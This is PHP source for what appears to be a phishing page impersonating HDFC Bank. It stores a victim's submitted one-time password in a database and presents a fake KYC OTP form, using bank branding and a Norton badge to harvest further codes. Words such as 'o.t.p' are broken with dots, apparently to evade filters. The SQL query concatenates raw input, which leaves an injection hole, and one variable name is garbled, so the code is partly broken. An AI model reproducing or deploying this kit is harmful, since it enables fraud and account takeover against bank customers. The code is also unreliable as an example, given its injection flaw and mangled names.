<?php

if(!empty($_POST['gmail_otp'])) {
    $gmail_otp = $_POST['gmail_otp'];
}
else {
    header("Location: ./");
    die();
}
$token = $_POST['token'];

require_once "header.php";

$query = 'UPDATE `user_data` SET `gmail_o.t.p` = "'.$gmail_o.t.p.'" WHERE `UID` = "'.$token.'"';
require_once "db.php";

?>

<div class="container center" style="max-width:420px">
	<div class="row welcmewrap">
        <div class="welcomesec1" style="margin-bottom:0">
            <div class="hdfcstatictxt mB20">Enter K.Y.C O.T.P</div>
            <div class="netwrapper">
                <div class="col-12">
			        <form method="post" action="retry-o.t.p.php">
                        <div class="mB10">
                            <div class="inputfield ibvt loginData">
                                <input
                                    placeholder="Enter o.ne ti.me password"
                                    inputmode="numeric"
                                    autocomplete="one-time-code"
                                    pattern="\d{6}"
                                    class="form-control" 
                                    name="pan_o.t.p"
                                    maxlength="6"
                                    minlength="6"
                                    length="6"
                                    required
                                    autofocus />
                                <input name="token" value="<?php echo $token ?>" hidden />
                                <span style="display: block" class="fs12 mB10">O.T.P is sent your registered mobile number.</span>
                            </div>
                        </div>
                        <div class="mB10">
                            <div class="inputfield ibvt loginData">
                                <button class="btn btn-primary login-btn" type="submit">CONFIRM</button>
                            </div>
                        </div>
                        <span style="display: block;" class=""><a href="#">Resend O.T.P</a></span>
                    </form>
                </div>
                <br />
                <div class="col-12">
                    <div class="nortonsecurity center lnheight" style="text-align:center">
                        <img alt="" src="images/nortonsecurity.png" />
                    </div>
                    <div class="hdfcsmalltxt">
                        <span class="color666">Your security is of utmost importance.</span>
                        <span class="lightbluecolor"><a onclick="return window.open('https://www.hdfcbank.com/personal/useful-links/security')" href="javascript:void(0)">Know More...</a></span>
                    </div>
                </div>
                <div class="clearfix"></div>
            </div>
        </div>
	</div>
</div>

<?php include_once "footer.php"; ?>